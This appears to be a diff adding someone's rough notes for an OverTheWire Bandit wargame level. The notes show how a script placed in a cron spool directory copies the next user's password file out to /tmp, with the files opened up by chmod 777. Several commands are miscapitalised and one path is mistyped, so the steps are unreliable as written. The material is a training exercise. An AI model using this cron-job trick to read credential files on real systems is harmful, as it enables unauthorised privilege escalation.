@@ -1,0 +1,22 @@
+Ls -l
+cd /etc/cron.d/
+cat cronjob_bandit24
+Cat /usr/bin/cronjob_bandit24.sh
+
+Mkdir /tmp/newscript
+Cd /tmp/newscript
+vim lvl23.sh
+
+Shell script
+#!/bin/sh
+cat /etc/bandit_pass/bandit24 > /tmp/newscript/pwd24
+:x
+
+Cat lvl23.sh
+Ls -l lvl23.sh
+Chmod 777 /tmp/newscript
+chmod 777 lvl23.sh
+Ls -l lvl23.sh
+
+cp lvl23.sh /vars/spool/bandit24 [wait 1 minute]
+cat pwd24
